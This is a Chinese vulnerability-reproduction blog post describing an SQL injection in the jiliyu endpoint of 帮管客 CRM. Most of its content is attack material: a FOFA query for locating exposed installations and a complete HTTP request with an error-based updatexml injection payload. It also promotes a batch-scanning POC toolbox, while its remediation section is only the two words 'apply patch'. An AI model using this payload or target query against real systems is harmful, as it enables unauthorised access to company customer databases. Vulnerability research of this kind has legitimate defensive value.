#  帮管客CRM jiliyu接口存在SQL漏洞 附POC软件   
南风徐来  南风漏洞复现文库   2024-03-09 20:17  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 帮管客CRM简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
帮管客CRM  
## 2.漏洞描述  
  
帮管客CRM客户管理系统专注于为企业提供crm客户关系管理、crm管理系统、crm软件产品及企业销售管理流程解决方案服务,助力企业业绩增长。帮管客CRM jiliyu接口存在SQL漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
帮管客CRM  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yu5iak5OYW9bH2Xe27UBYYBQKFavHWn18C0oljOIlFzBP8EwyujWzeR8epz0Ficadwj7j3eT2C1LLg/640?wx_fmt=jpeg&from=appmsg "null")  
  
帮管客CRM jiliyu接口存在SQL漏洞  
## 4.fofa查询语句  
  
app="帮管客-CRM"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20md5(1)),0x7f),1))  
  
漏洞数据包：  
```
GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=激励语列表&xu=and%201=(updatexml(1,concat(0x7f,(select%20md5(1)),0x7f),1)) HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yu5iak5OYW9bH2Xe27UBYYBR47nZTvleW7F3LfUBB7eYvUd9LT8nqxC7ibepHJjHEBmEnbuwicmGRNw/640?wx_fmt=jpeg&from=appmsg "")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yu5iak5OYW9bH2Xe27UBYYBoP8YkGIHDGPNPa2oyrpWaXOoXFdIVibkric5jF1ICagDt7saHDJG1HxA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yu5iak5OYW9bH2Xe27UBYYBAy6lt9icyvNibZIXxLx0tqicgerjDsJUwHFlFPW98ts2mRqHp3en8JZ0g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yu5iak5OYW9bH2Xe27UBYYBBTjM6INk5qgl2BVJF8p3aQ9ic2LgCWOdx0VrhgOmGicsBcGuuPCOW6XQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yu5iak5OYW9bH2Xe27UBYYBRVduWR9TFS6k22icMemuPHiabzQllULVxN1h4cQJ09vcQE3pU6m69Igw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3Yu5iak5OYW9bH2Xe27UBYYB5nQQbAvqccdDou2J11c1LugLBJM7yp89CohrUGKr3xBrLYfMG2YwTg/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
